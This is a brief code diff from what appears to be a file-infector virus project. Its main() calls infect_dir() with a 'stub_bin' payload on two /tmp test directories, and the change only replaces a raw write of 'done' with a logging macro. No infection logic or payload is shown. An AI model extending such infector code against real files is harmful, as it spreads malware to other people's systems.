@@ -20,7 +20,7 @@ int main(void) {
 	//        instead of searching through the text
 	infect_dir("/tmp/test", stub_bin, stub_bin_len);
 	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
-	sys_write(STDOUT_FILENO, "done\n", 5);
+	LOG("done\n");
 	return (0);
 }
 
@@ -29,7 +29,7 @@ int main(void) {
 int main(void) {
 	infect_dir("/tmp/test", stub_bin, stub_bin_len);
 	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
-	sys_write(STDOUT_FILENO, "done\n", 5);
+	LOG("done\n");
 	return (0);
 }
 
